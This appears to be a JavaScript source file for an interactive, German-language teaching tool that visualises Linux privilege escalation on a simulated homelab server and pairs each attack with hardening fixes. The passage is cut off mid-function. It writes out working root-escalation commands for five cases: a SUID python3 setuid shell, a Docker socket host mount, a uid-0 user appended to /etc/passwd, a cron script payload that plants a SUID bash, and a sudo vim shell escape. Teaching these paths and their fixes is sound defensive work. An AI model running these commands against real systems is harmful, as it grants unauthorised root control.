/* === PRIVILEGE ESCALATION PATH VISUALIZER === */
(function () {
  'use strict';

  // ============================================================
  // SCENARIOS
  // ============================================================
  var SCENARIOS = {
    suid: {
      id: 'suid', label: 'SUID Binary', icon: '🔧',
      misconfigLabel: '/usr/bin/python3 hat SUID-Bit gesetzt',
      misconfigs: ['suid_python'],
      path: [
        { node: 'www-data', uid: 33, color: '#4fffb0' },
        { edge: 'find / -perm -4000', edgeColor: '#fb923c' },
        { node: 'python3 (SUID=root)', uid: null, color: '#f59e0b' },
        { edge: 'os.setuid(0)', edgeColor: '#ef4444' },
        { node: 'ROOT', uid: 0, color: '#ef4444' }
      ],
      steps: [
        {
          title: 'Reconnaissance — wer bin ich?',
          commands: [
            { cmd: 'whoami', out: 'www-data' },
            { cmd: 'id', out: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' },
            { cmd: 'uname -a', out: 'Linux proxmox 6.8.12-1-pve #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux' }
          ],
          findings: ['Wir sind www-data (uid=33)', 'Kernel 6.8.12 — keine bekannten PrivEsc-CVEs', 'Keine interessanten Gruppen'],
          checklistItems: ['whoami_id', 'kernel']
        },
        {
          title: 'Enumeration — SUID Binaries suchen',
          commands: [
            { cmd: 'find / -perm -4000 2>/dev/null', out: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/python3\n/usr/bin/mount\n/usr/bin/umount' }
          ],
          highlight: '/usr/bin/python3',
          findings: ['⚠ python3 mit SUID — NOT normal!', 'passwd/sudo/mount/umount sind standard', 'GTFOBins: python3 SUID → direkter root'],
          checklistItems: ['suid_binaries']
        },
        {
          title: 'Exploitation — SUID python3 ausnutzen',
          commands: [
            { cmd: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", out: '' },
            { cmd: 'whoami', out: 'root', root: true },
            { cmd: 'id', out: 'uid=0(root) gid=33(www-data) groups=33(www-data)', root: true }
          ],
          success: true,
          findings: ['SUID = "run as file owner"', 'python3 gehört root → läuft als root', 'os.setuid(0) setzt effektive UID auf 0']
        }
      ],
      defense: {
        title: 'Fix: SUID Binary',
        fixes: [
          { label: 'SUID-Bit entfernen', cmd: 'chmod u-s /usr/bin/python3' },
          { label: 'Alle SUID-Binaries auflisten', cmd: "find / -perm -4000 -type f 2>/dev/null\n# Normal: passwd, sudo, mount, su, umount\n# Alles andere: verdächtig!" },
          { label: 'Monitoring mit auditd', cmd: 'auditctl -w /usr/bin/python3 -p a -k suid_change' },
          { label: 'Homelab-Check', cmd: "find / -perm -4000 -type f 2>/dev/null \\\n  | grep -v '/usr/bin/\\(passwd\\|sudo\\|mount\\|su\\|umount\\)'" }
        ]
      }
    },

    docker: {
      id: 'docker', label: 'Docker Socket', icon: '🐳',
      misconfigLabel: '/var/run/docker.sock ist world-readable',
      misconfigs: ['docker_sock'],
      path: [
        { node: 'www-data', uid: 33, color: '#4fffb0' },
        { edge: 'ls -la /var/run/docker.sock', edgeColor: '#fb923c' },
        { node: 'docker socket (rw)', uid: null, color: '#f59e0b' },
        { edge: 'docker run -v /:/mnt alpine', edgeColor: '#ef4444' },
        { node: 'ROOT (chroot)', uid: 0, color: '#ef4444' }
      ],
      steps: [
        {
          title: 'Reconnaissance — Gruppen & Services',
          commands: [
            { cmd: 'whoami', out: 'www-data' },
            { cmd: 'id', out: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' },
            { cmd: 'ls -la /var/run/docker.sock', out: 'srw-rw-rw- 1 root docker 0 Apr 20 10:00 /var/run/docker.sock' }
          ],
          findings: ['docker.sock ist world-readable/writable (rw-rw-rw-)!', 'Docker-Socket = Root-Zugang', 'Kein Passwort, kein sudo nötig'],
          checklistItems: ['whoami_id', 'docker_sock']
        },
        {
          title: 'Enumeration — Docker verfügbar?',
          commands: [
            { cmd: 'docker ps', out: 'CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS\n(leer — kein Container läuft)' },
            { cmd: 'docker images', out: 'REPOSITORY   TAG   IMAGE ID\nalpine       latest  a606584aa9aa' }
          ],
          findings: ['Docker-Client funktioniert (kein sudo nötig)', 'alpine Image vorhanden', 'Host-Filesystem über Volume mountbar'],
          checklistItems: ['docker_sock']
        },
        {
          title: 'Exploitation — Host-FS mounten',
          commands: [
            { cmd: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', out: '# ← Root-Shell im Container mit Host-FS!' },
            { cmd: 'whoami', out: 'root', root: true },
            { cmd: 'cat /etc/shadow', out: 'root:$6$xyz....:19000:0:99999:7:::\nnoob:$6$abc....:19000:0:99999:7:::', root: true }
          ],
          success: true,
          findings: ['-v /:/mnt mountet das gesamte Host-Dateisystem', 'chroot /mnt wechselt root ins Host-FS', 'Vollzugriff auf /etc/shadow, SSH-Keys, alles']
        }
      ],
      defense: {
        title: 'Fix: Docker Socket',
        fixes: [
          { label: 'Docker Socket Permissions härten', cmd: 'chmod 660 /var/run/docker.sock\nchown root:docker /var/run/docker.sock' },
          { label: 'Nur vertrauenswürdige User in docker-Gruppe', cmd: 'usermod -aG docker TRUSTED_USER\n# NIEMALS: www-data, nginx, apache in docker-Gruppe!' },
          { label: 'Rootless Docker (empfohlen)', cmd: '# Docker als non-root User betreiben\ndockerd-rootless-setuptool.sh install' },
          { label: 'Socket nicht exposen (z.B. kein Portainer ohne Auth)', cmd: '# Portainer/Traefik: Docker-Socket nur mit auth!' }
        ]
      }
    },

    passwd: {
      id: 'passwd', label: 'Writable /etc/passwd', icon: '📝',
      misconfigLabel: '/etc/passwd ist world-writable (chmod 666)',
      misconfigs: ['writable_passwd'],
      path: [
        { node: 'www-data', uid: 33, color: '#4fffb0' },
        { edge: 'ls -la /etc/passwd', edgeColor: '#fb923c' },
        { node: '/etc/passwd (writable)', uid: null, color: '#f59e0b' },
        { edge: 'echo hacker:...:0:0 >> /etc/passwd', edgeColor: '#ef4444' },
        { node: 'ROOT (su hacker)', uid: 0, color: '#ef4444' }
      ],
      steps: [
        {
          title: 'Reconnaissance — Dateiberechtigungen',
          commands: [
            { cmd: 'whoami', out: 'www-data' },
            { cmd: 'ls -la /etc/passwd', out: '-rw-rw-rw- 1 root root 2847 Apr 20 10:00 /etc/passwd' }
          ],
          findings: ['/etc/passwd ist world-writable (rw-rw-rw-)!', 'Normal: -rw-r--r-- (644)', 'Jeder User kann Zeilen hinzufügen!'],
          checklistItems: ['whoami_id', 'writable_files']
        },
        {
          title: 'Enumeration — /etc/passwd Format verstehen',
          commands: [
            { cmd: 'head -3 /etc/passwd', out: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' },
            { cmd: "openssl passwd -1 'hacked'", out: '$1$abc12345$xyz...' }
          ],
          findings: ['Format: user:passhash:uid:gid:comment:home:shell', 'uid=0 = root', 'openssl passwd generiert kompatiblen Hash'],
          checklistItems: ['writable_files']
        },
        {
          title: 'Exploitation — Root-User anlegen',
          commands: [
            { cmd: "echo 'hacker:$(openssl passwd -1 hacked):0:0::/root:/bin/bash' >> /etc/passwd", out: '' },
            { cmd: 'su hacker', out: 'Password: hacked\n# Root-Shell!' },
            { cmd: 'whoami', out: 'root', root: true },
            { cmd: 'id', out: 'uid=0(root) gid=0(root) groups=0(root)', root: true }
          ],
          success: true,
          findings: ['uid=0 in /etc/passwd = root, egal welcher Username', 'Kein sudo, kein SUID nötig — direkt root', 'su liest /etc/passwd → neuer User mit uid=0']
        }
      ],
      defense: {
        title: 'Fix: /etc/passwd Permissions',
        fixes: [
          { label: 'Korrekte Permissions setzen', cmd: 'chmod 644 /etc/passwd\nchmod 640 /etc/shadow' },
          { label: 'Regelmäßig prüfen', cmd: 'stat /etc/passwd /etc/shadow\n# Sollte sein: 644 und 640' },
          { label: 'AIDE/Tripwire für Monitoring', cmd: 'aide --check  # warnt bei Änderungen an /etc/passwd\n# auditd: auditctl -w /etc/passwd -p wa -k passwd_change' },
          { label: 'Immutable Flag (extra Schutz)', cmd: 'chattr +i /etc/passwd  # macht Datei unveränderbar\n# zum Ändern: chattr -i /etc/passwd' }
        ]
      }
    },

    cron: {
      id: 'cron', label: 'Cronjob Hijack', icon: '⏰',
      misconfigLabel: 'Root-Cronjob führt www-data-beschreibbares Script aus',
      misconfigs: ['writable_cron'],
      path: [
        { node: 'www-data', uid: 33, color: '#4fffb0' },
        { edge: 'cat /etc/crontab', edgeColor: '#fb923c' },
        { node: '/opt/scripts/backup.sh (writable)', uid: null, color: '#f59e0b' },
        { edge: 'echo PAYLOAD >> backup.sh', edgeColor: '#ef4444' },
        { node: 'ROOT (nach 1 Min)', uid: 0, color: '#ef4444' }
      ],
      steps: [
        {
          title: 'Reconnaissance — Cronjobs lesen',
          commands: [
            { cmd: 'whoami', out: 'www-data' },
            { cmd: 'cat /etc/crontab', out: '# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root /opt/scripts/backup.sh\n0 2 * * * root /opt/scripts/cleanup.sh' }
          ],
          findings: ['* * * * * = jede Minute!', 'Script wird als root ausgeführt', '/opt/scripts/backup.sh — prüfen ob schreibbar!'],
          checklistItems: ['whoami_id', 'cronjobs']
        },
        {
          title: 'Enumeration — Script-Permissions prüfen',
          commands: [
            { cmd: 'ls -la /opt/scripts/', out: '-rwxrwxrwx 1 root root 87 Apr 20 /opt/scripts/backup.sh\n-rwxr-xr-x 1 root root 45 Apr 20 /opt/scripts/cleanup.sh' },
            { cmd: 'cat /opt/scripts/backup.sh', out: '#!/bin/bash\ntar -czf /backup/www.tar.gz /var/www 2>/dev/null\necho "Backup done: $(date)" >> /var/log/backup.log' }
          ],
          findings: ['backup.sh ist 777 = world-writable!', 'Script läuft als root jede Minute', 'Alles was wir anhängen, läuft als root'],
          checklistItems: ['writable_files', 'cronjobs']
        },
        {
          title: 'Exploitation — Payload injizieren',
          commands: [
            { cmd: 'echo "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" >> /opt/scripts/backup.sh', out: '(warte 1 Minute auf Cronjob...)' },
            { cmd: 'ls -la /tmp/rootbash', out: '-rwsr-xr-x 1 root root 1396520 Apr 20 10:01 /tmp/rootbash' },
            { cmd: '/tmp/rootbash -p', out: 'rootbash-5.2# ', root: true },
            { cmd: 'whoami', out: 'root', root: true }
          ],
          success: true,
          findings: ['-p = "privileged" — behält SUID-Rechte', 'rootbash hat SUID root → läuft als root', 'Cronjob hat unsere Kopie erstellt und SUID gesetzt']
        }
      ],
      defense: {
        title: 'Fix: Cronjob Scripts',
        fixes: [
          { label: 'Korrekte Script-Permissions', cmd: 'chmod 755 /opt/scripts/backup.sh\nchown root:root /opt/scripts/backup.sh\n# Nur root darf schreiben!' },
          { label: 'Scripts in sicherem Verzeichnis', cmd: 'chmod 755 /opt/scripts/\nchown root:root /opt/scripts/\n# Verzeichnis selbst: nicht world-writable!' },
          { label: 'Crontab regelmäßig auditieren', cmd: 'crontab -l -u root\ncat /etc/crontab\nls /etc/cron.d/ /etc/cron.daily/' },
          { label: 'Writable Scripts finden', cmd: "find /etc/cron* /opt /usr/local -writable -type f 2>/dev/null\n# Alles hier: potenzielle Hijack-Ziele!" }
        ]
      }
    },

    sudo: {
      id: 'sudo', label: 'sudo Misconfig', icon: '🔑',
      misconfigLabel: 'www-data darf vim als root ausführen (NOPASSWD)',
      misconfigs: ['sudo_vim'],
      path: [
        { node: 'www-data', uid: 33, color: '#4fffb0' },
        { edge: 'sudo -l', edgeColor: '#fb923c' },
        { node: 'sudo vim (als root)', uid: null, color: '#f59e0b' },
        { edge: 'vim -c "!bash"', edgeColor: '#ef4444' },
        { node: 'ROOT (Shell in vim)', uid: 0, color: '#ef4444' }
      ],
      steps: [
        {
          title: 'Reconnaissance — sudo Rechte prüfen',
          commands: [
            { cmd: 'whoami', out: 'www-data' },
            { cmd: 'sudo -l', out: 'Matching Defaults entries for www-data on proxmox:\n    env_reset, mail_badpass\n\nUser www-data may run the following commands on proxmox:\n    (ALL) NOPASSWD: /usr/bin/vim' }
          ],
          findings: ['www-data darf vim als root ausführen!', 'NOPASSWD = kein Passwort nötig', 'vim kann Shell-Befehle ausführen → GTFOBins'],
          checklistItems: ['whoami_id', 'sudo_l']
        },
        {
          title: 'Enumeration — GTFOBins für vim',
          commands: [
            { cmd: 'sudo vim --version | head -2', out: 'VIM - Vi IMproved 9.1 (2024 Jan 2, compiled Apr 01 2024)\nIncluded patches: 1-496' }
          ],
          findings: ['GTFOBins: sudo vim -c \'!bash\'', ':!command führt Shell-Befehl aus', 'vim läuft als root → Shell läuft als root'],
          checklistItems: ['sudo_l']
        },
        {
          title: 'Exploitation — Shell aus vim',
          commands: [
            { cmd: "sudo vim -c '!bash'", out: '(vim öffnet, dann :!bash ausführen)\n\nbash: /proc/self/fd/1: No such file or directory\n\n# Alternativ:' },
            { cmd: "sudo vim -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'", out: '', root: true },
            { cmd: 'whoami', out: 'root', root: true },
            { cmd: 'sudo vim /etc/sudoers', out: '# Nun kann alles geändert werden', root: true }
          ],
          success: true,
          findings: ['vim -c führt Ex-Commands aus', ':!bash öffnet Shell mit vim\'s Rechten (root)', 'Alternative: :py3 für Python-Execution in vim']
        }
      ],
      defense: {
        title: 'Fix: sudo Misconfig',
        fixes: [
          { label: 'Sudoers sicher konfigurieren', cmd: '# SCHLECHT:\nwww-data ALL=(ALL) NOPASSWD: /usr/bin/vim\n\n# GUT: Nichts für Service-User!\n# Service-User brauchen KEIN sudo!' },
          { label: 'GTFOBins-gefährliche Programme vermeiden', cmd: '# GEFÄHRLICH in sudo:\nvim, nano, less, man, find, python, perl, ruby, bash, sh\n# → Alle können Shell spawnen!\n# Auf GTFOBins.github.io prüfen!' },
          { label: 'Minimales sudo — nur spezifische Befehle', cmd: '# Falls sudo nötig: sehr spezifisch!\ndeploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx\n# Nicht: ALL oder ganze Interpreter!' },
          { label: 'sudo Konfiguration auditieren', cmd: 'visudo -c  # Syntax prüfen\nsudo -l -U www-data  # Was darf www-data?' }
        ]
      }
    },

    all: {
      id: 'all', label: 'Alle kombiniert', icon: '🧩',
      misconfigLabel: 'Server hat ALLE Misconfigurations gleichzeitig',
      misconfigs: ['suid_python', 'docker_sock', 'writable_passwd', 'writable_cron', 'sudo_vim'],
      multiPath: true
    }
  };

  // ============================================================
  // CHECKLIST ITEMS
  // ============================================================
  var CHECKLIST = [
    { id: 'whoami_id',     label: 'whoami / id',           result: 'www-data, keine Gruppen' },
    { id: 'kernel',        label: 'Kernel-Version',         result: '6.8.12, aktuell' },
    { id: 'suid_binaries', label: 'SUID Binaries',         result: null },
    { id: 'sudo_l',        label: 'sudo -l',               result: null },
    { id: 'cronjobs',      label: 'Cronjobs',              result: null },
    { id: 'docker_sock',   label: 'Docker Socket',         result: null },
    { id: 'writable_files',label: 'Writable Dateien',      result: null },
    { id: 'bash_history',  label: '.bash_history',         result: 'noch nicht geprüft' },
    { id: 'ssh_keys',      label: 'SSH Keys',              result: 'noch nicht geprüft' },
    { id: 'network',       label: 'Netzwerk (ip/ifconfig)', result: 'noch nicht geprüft' }
  ];

  // ============================================================
  // LINPEAS OUTPUT (simulated)
  // ============================================================
  var LINPEAS_LINES = [
    { text: '╔══════════════════════════════════════════════════╗', color: '#ef4444', delay: 0 },
    { text: '║           LinPEAS v3.1.2 — Linux PrivEsc         ║', color: '#ef4444', delay: 60 },
    { text: '╚══════════════════════════════════════════════════╝', color: '#ef4444', delay: 120 },
    { text: '', delay: 180 },
    { text: '════════════ Basic Information ══════════════════════', color: '#22d3ee', delay: 240 },
    { text: '  OS: Debian GNU/Linux 13 (trixie)', color: '#4fffb0', delay: 300 },
    { text: '  Kernel: 6.8.12-1-pve', color: '#4fffb0', delay: 360 },
    { text: '  Hostname: proxmox', color: '#4fffb0', delay: 420 },
    { text: '  User: www-data (uid=33)', color: '#4fffb0', delay: 480 },
    { text: '', delay: 540 },
    { text: '════════════ Interesting SUID Files ════════════════', color: '#ef4444', delay: 600 },
    { text: '  🔴 /usr/bin/python3 → SUID set, owned by root!', color: '#ef4444', delay: 680 },
    { text: '     GTFOBins: python3 -c \'import os;os.setuid(0);os.system("/bin/bash")\'', color: '#fb923c', delay: 740 },
    { text: '  ✅ /usr/bin/passwd  → normal', color: '#6b7280', delay: 800 },
    { text: '  ✅ /usr/bin/sudo    → normal', color: '#6b7280', delay: 840 },
    { text: '  ✅ /usr/bin/mount   → normal', color: '#6b7280', delay: 880 },
    { text: '', delay: 940 },
    { text: '════════════ Docker Socket ══════════════════════════', color: '#ef4444', delay: 1000 },
    { text: '  🔴 /var/run/docker.sock → srw-rw-rw- (world-writable!)', color: '#ef4444', delay: 1080 },
    { text: '     docker run -v /:/mnt -it alpine chroot /mnt sh', color: '#fb923c', delay: 1140 },
    { text: '', delay: 1200 },
    { text: '════════════ Writable Critical Files ════════════════', color: '#f59e0b', delay: 1260 },
    { text: '  🔴 /etc/passwd → -rw-rw-rw- (world-writable!)', color: '#ef4444', delay: 1340 },
    { text: '  🟡 /opt/scripts/backup.sh → writable by www-data', color: '#f59e0b', delay: 1400 },
    { text: '', delay: 1460 },
    { text: '════════════ Sudo Configuration ═════════════════════', color: '#f59e0b', delay: 1520 },
    { text: '  🔴 www-data → (ALL) NOPASSWD: /usr/bin/vim', color: '#ef4444', delay: 1600 },
    { text: '     sudo vim -c \'!bash\'  → GTFOBins confirmed', color: '#fb923c', delay: 1660 },
    { text: '', delay: 1720 },
    { text: '════════════ Crontab ════════════════════════════════', color: '#f59e0b', delay: 1780 },
    { text: '  🟡 * * * * * root /opt/scripts/backup.sh', color: '#f59e0b', delay: 1860 },
    { text: '     Script is writable by www-data!', color: '#f59e0b', delay: 1920 },
    { text: '', delay: 1980 },
    { text: '════════════ Summary ════════════════════════════════', color: '#22d3ee', delay: 2040 },
    { text: '  🔴 CRITICAL: 4 findings', color: '#ef4444', delay: 2100 },
    { text: '  🟡 WARNING:  2 findings', color: '#f59e0b', delay: 2140 },
    { text: '  ✅ OK:       kernel version, standard SUIDs', color: '#4fffb0', delay: 2180 },
    { text: '', delay: 2240 },
    { text: 'LinPEAS done. Happy hacking (on your own systems!)', color: '#ef4444', delay: 2300 }
  ];

  // ============================================================
  // TERMINAL COMMANDS
  // ============================================================
  var TERMINAL_COMMANDS = {
    whoami:      { out: 'www-data', checklist: ['whoami_id'] },
    id:          { out: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)', checklist: ['whoami_id'] },
    'uname -a':  { out: 'Linux proxmox 6.8.12-1-pve #1 SMP x86_64 GNU/Linux', checklist: ['kernel'] },
    'uname -r':  { out: '6.8.12-1-pve', checklist: ['kernel'] },
    'sudo -l':   { out: null, checklist: ['sudo_l'] },
    'cat /etc/crontab': { out: null, checklist: ['cronjobs'] },
    'find / -perm -4000 2>/dev/null': { out: null, checklist: ['suid_binaries'] },
    'find / -perm -4000': { out: null, checklist: ['suid_binaries'] },
    'ls -la /var/run/docker.sock': { out: null, checklist: ['docker_sock'] },
    'ls -la /etc/passwd': { out: null, checklist: ['writable_files'] },
    'cat /etc/passwd': { out: null, checklist: ['writable_files'] },
    groups:      { out: 'www-data', checklist: ['whoami_id'] },
    hostname:    { out: 'proxmox', checklist: [] },
    'ip a':      { out: '1: lo ... inet 127.0.0.1\n2: eth0 ... inet 192.168.0.200/24', checklist: ['network'] },
    ifconfig:    { out: 'eth0: ... inet 192.168.0.200  netmask 255.255.255.0', checklist: ['network'] },
    'cat ~/.bash_history': { out: 'ls\npwd\ncd /var/www\nphp -r \'phpinfo();\'', checklist: ['bash_history'] },
    'ls ~/.ssh': { out: 'ls: cannot access \'/var/www/.ssh\': No such file or directory', checklist: ['ssh_keys'] },
    pwd:         { out: '/var/www/html', checklist: [] },
    ls:          { out: 'html  logs', checklist: [] },
    help:        { out: 'Verfügbare Befehle: whoami, id, uname -a, sudo -l, find / -perm -4000 2>/dev/null,\nls -la /var/run/docker.sock, cat /etc/crontab, ls -la /etc/passwd,\ngroups, hostname, ip a, pwd, ls, cat ~/.bash_history, ls ~/.ssh', checklist: [] }
  };

  // ============================================================
  // STATE
  // ============================================================
  var state = {
    scenario: 'suid',
    currentStep: 0,
    checkedItems: [],
    terminalHistory: [],
    linpeasRunning: false,
    linpeasTimer: null,
    autoPlaying: false,
    autoTimer: null,
    defenseOpen: false
  };

  // ============================================================
  // INIT
  // ============================================================
  function init() {
    console.log('[privesc] init() aufgerufen');
    console.log('[privesc] server-model:', !!document.getElementById('server-model'));
    console.log('[privesc] path-graph:', !!document.getElementById('path-graph'));
    console.log('[privesc] step-content:', !!document.getElementById('step-content'));
    console.log('[privesc] checklist:', !!document.getElementById('checklist'));
    console.log('[privesc] term-input:', !!document.getElementById('term-input'));
    console.log('[privesc] term-output:', !!document.getElementById('term-output'));
    bindScenarioButtons();
    bindStepControls();
    bindTerminal();
    bindLinpeas();
    bindDefense();
    selectScenario('suid');
  }

  // ============================================================
  // SCENARIO
  // ============================================================
  function selectScenario(id) {
    stopAutoPlay();
    state.scenario = id;
    state.currentStep = 0;
    state.checkedItems = [];
    document.querySelectorAll('[data-scenario]').forEach(function(b) {
      b.classList.toggle('active', b.dataset.scenario === id);
    });
    renderAll();
  }

  function bindScenarioButtons() {
    document.querySelectorAll('[data-scenario]').forEach(function(btn) {
      btn.addEventListener('click', function() { selectScenario(this.dataset.scenario); });
    });
  }

  // ============================================================
  // RENDER ALL
  // ============================================================
  function renderAll() {
    renderServerModel();
    renderPathGraph();
    renderSteps();
    renderChecklist();
    renderDefense();
    updateStepControls();
    updateNmapSuggestions();
  }

  // ============================================================
  // SERVER MODEL (layered visualization)
  // ============================================================
  function renderServerModel() {
    var el = document.getElementById('server-model');
    if (!el) return;
    var sc = SCENARIOS[state.scenario];
    var misconfigs = sc.misconfigs || [];

    var suidHighlight = misconfigs.indexOf('suid_python') !== -1 ? ' pv-miscfg' : '';
    var dockerHighlight = misconfigs.indexOf('docker_sock') !== -1 ? ' pv-miscfg' : '';
    var passwdHighlight = misconfigs.indexOf('writable_passwd') !== -1 ? ' pv-miscfg' : '';
    var cronHighlight = misconfigs.indexOf('writable_cron') !== -1 ? ' pv-miscfg' : '';
    var sudoHighlight = misconfigs.indexOf('sudo_vim') !== -1 ? ' pv-miscfg' : '';

    var isRooted = state.currentStep >= (getCurrentScenarioSteps().length - 1) &&
      getCurrentScenarioSteps().length > 0 &&
      getCurrentScenarioSteps()[getCurrentScenarioSteps().length - 1].success;

    el.innerHTML =
      '<div class="pv-layer pv-layer-root' + (isRooted ? ' pv-current' : '') + '">' +
        '<div class="pv-layer-label">🔴 ROOT (uid=0)</div>' +
        '<div class="pv-layer-sub">Volle Kontrolle · /etc/shadow · kernel · alles</div>' +
      '</div>' +
      '<div class="pv-layer pv-layer-priv">' +
        '<div class="pv-layer-label">Privilegierte Vektoren</div>' +
        '<div class="pv-privs">' +
          '<div class="pv-priv-box' + suidHighlight + '" title="SUID Binary">🔧 SUID<br><span>python3 u+s</span></div>' +
          '<div class="pv-priv-box' + dockerHighlight + '" title="Docker Socket">🐳 Docker<br><span>sock rw</span></div>' +
          '<div class="pv-priv-box' + passwdHighlight + '" title="Writable /etc/passwd">📝 /etc/passwd<br><span>world-write</span></div>' +
          '<div class="pv-priv-box' + cronHighlight + '" title="Writable Cronjob Script">⏰ Cronjob<br><span>script 777</span></div>' +
          '<div class="pv-priv-box' + sudoHighlight + '" title="sudo vim NOPASSWD">🔑 sudo vim<br><span>NOPASSWD</span></div>' +
        '</div>' +
      '</div>' +
      '<div class="pv-layer pv-layer-users">' +
        '<div class="pv-layer-label">System Users</div>' +
        '<div class="pv-users">' +
          '<div class="pv-user-box"><div>noob</div><div>uid=1000</div></div>' +
          '<div class="pv-user-box"><div>deploy</div><div>uid=1001</div></div>' +
          '<div class="pv-user-box"><div>backup</div><div>uid=1002</div></div>' +
        '</div>' +
      '</div>' +
      '<div class="pv-layer pv-layer-www' + (!isRooted ? ' pv-current' : '') + '">' +
        '<div class="pv-layer-label">🟡 www-data (uid=33) ← DU STARTEST HIER</div>' +
        '<div class="pv-layer-sub">Webserver-User · nur /var/www lesen · keine sudo-Rechte</div>' +
      '</div>';
  }

  // ============================================================
  // PATH GRAPH
  // ============================================================
  function renderPathGraph() {
    var el = document.getElementById('path-graph');
    if (!el) return;
    var sc = SCENARIOS[state.scenario];
    if (sc.multiPath) {
      renderMultiPath(el);
      return;
    }
    var path = sc.path;
    var steps = getCurrentScenarioSteps();
    var completedEdges = state.currentStep; // after step N, N edges are revealed

    var html = '<div class="pg-chain">';
    path.forEach(function(item, i) {
      var revealed = i <= completedEdges * 2; // each step reveals node+edge
      if (item.node !== undefined) {
        var isRoot = item.uid === 0;
        var isCurrent = i === 0 && state.currentStep === 0;
        html += '<div class="pg-node' + (revealed ? ' pg-visible' : '') + (isRoot && revealed ? ' pg-node-root' : '') + (isCurrent ? ' pg-node-current' : '') +
          '" style="border-color:' + (revealed ? item.color : 'var(--border)') + ';color:' + (revealed ? item.color : 'var(--muted)') + '">' +
          esc(item.node) + (item.uid !== null ? '<div style="font-size:10px;opacity:0.7">uid=' + item.uid + '</div>' : '') +
          '</div>';
      } else if (item.edge !== undefined) {
        html += '<div class="pg-edge' + (revealed ? ' pg-visible' : '') + '">' +
          '<div class="pg-edge-arrow" style="background:' + (revealed ? item.edgeColor : 'var(--border)') + '"></div>' +
          '<div class="pg-edge-label" style="color:' + (revealed ? item.edgeColor : 'var(--muted)') + '">' + esc(item.edge) + '</div>' +
          '</div>';
      }
    });
    html += '</div>';
    el.innerHTML = html;
  }

  function renderMultiPath(el) {
    el.innerHTML =
      '<div style="font-family:\'JetBrains Mono\',monospace;font-size:12px;color:var(--muted)">' +
      '<div style="color:var(--text);margin-bottom:12px">Alle Pfade von www-data → root:</div>' +
      Object.keys(SCENARIOS).filter(function(k) { return k !== 'all'; }).map(function(k) {
        var sc = SCENARIOS[k];
        return '<div style="margin-bottom:8px;display:flex;align-items:center;gap:8px">' +
          '<span style="font-size:14px">' + sc.icon + '</span>' +
          '<span style="color:#ef4444">www-data</span>' +
          '<span style="color:var(--muted)">─' + sc.icon + '─</span>' +
          '<span style="color:var(--accent)">' + esc(sc.label) + '</span>' +
          '<span style="color:var(--muted)">──→</span>' +
          '<span style="color:#ef4444">ROOT</span>' +
          '</div>';
      }).join('') +
      '</div>';
  }

  // ============================================================
  // STEPS
  // ============================================================
  function getCurrentScenarioSteps() {
    var sc = SCENARIOS[state.scenario];
    if (sc.multiPath) return [];
    return sc.steps || [];
  }

  function renderSteps() {
    var el = document.getElementById('step-content');
    if (!el) return;
    var steps = getCurrentScenarioSteps();
    if (steps.length === 0) {
      el.innerHTML = '<div style="color:var(--muted);font-family:\'JetBrains Mono\',monospace;font-size:13px;padding:20px">Wähle ein Einzel-Szenario um die Schritte zu sehen. Im "Alle kombiniert"-Modus nutze das Terminal unten, um alle Vektoren selbst zu erkunden.</div>';
      return;
    }
    var step = steps[state.currentStep];
    if (!step) return;

    var html = '<div class="pv-step-header">' +
      '<span class="pv-step-num">Schritt ' + (state.currentStep + 1) + ' / ' + steps.length + '</span>' +
      '<span class="pv-step-title">' + esc(step.title) + '</span>' +
      '</div>';

    html += '<div class="pv-terminal">';
    (step.commands || []).forEach(function(c) {
      html += '<div class="pv-term-prompt">' +
        '<span class="pv-prompt-user' + (c.root ? ' pv-root-prompt' : '') + '">' + (c.root ? 'root' : 'www-data') + '@proxmox</span>' +
        '<span class="pv-prompt-sep">:</span>' +
        '<span class="pv-prompt-dir">' + (c.root ? '/root' : '/var/www') + '</span>' +
        '<span class="pv-prompt-hash">' + (c.root ? '#' : '$') + '</span> ' +
        '<span class="pv-cmd">' + esc(c.cmd) + '</span>' +
        '</div>';
      if (c.out) {
        var lines = c.out.split('\n');
        lines.forEach(function(line) {
          var isHighlight = step.highlight && line.indexOf(step.highlight) !== -1;
          html += '<div class="pv-term-out' + (isHighlight ? ' pv-term-highlight' : '') + (c.root ? ' pv-term-root' : '') + '">' + esc(line) + '</div>';
        });
      }
    });
    html += '</div>';

    if (step.success) {
      html += '<div class="pv-success-banner">' +
        '<div class="pv-success-title">🎯 PRIVILEGE ESCALATION ERFOLGREICH!</div>' +
        '<div class="pv-success-sub">www-data → root · Volle Kontrolle über den Server</div>' +
        '</div>';
    }

    if (step.findings && step.findings.length > 0) {
      html += '<div class="pv-findings">';
      step.findings.forEach(function(f) {
        var isWarn = f.charAt(0) === '⚠';
        html += '<div class="pv-finding' + (isWarn ? ' pv-finding-warn' : '') + '">' + esc(f) + '</div>';
      });
      html += '</div>';
    }

    el.innerHTML = html;
    if (step.checklistItems) {
      step.checklistItems.forEach(function(id) { checkItem(id, step); });
    }
  }

  function checkItem(id, step) {
    if (state.checkedItems.indexOf(id) === -1) {
      state.checkedItems.push(id);
      var sc = SCENARIOS[state.scenario];
      // Set result based on scenario misconfigs
      CHECKLIST.forEach(function(item) {
        if (item.id === id) {
          if (id === 'suid_binaries') item.result = sc.misconfigs.indexOf('suid_python') !== -1 ? '⚠ python3 mit SUID!' : 'OK — standard SUIDs';
          if (id === 'sudo_l') item.result = sc.misconfigs.indexOf('sudo_vim') !== -1 ? '⚠ vim NOPASSWD!' : 'keine sudo-Rechte';
          if (id === 'cronjobs') item.result = sc.misconfigs.indexOf('writable_cron') !== -1 ? '⚠ backup.sh writable!' : 'OK — keine writable scripts';
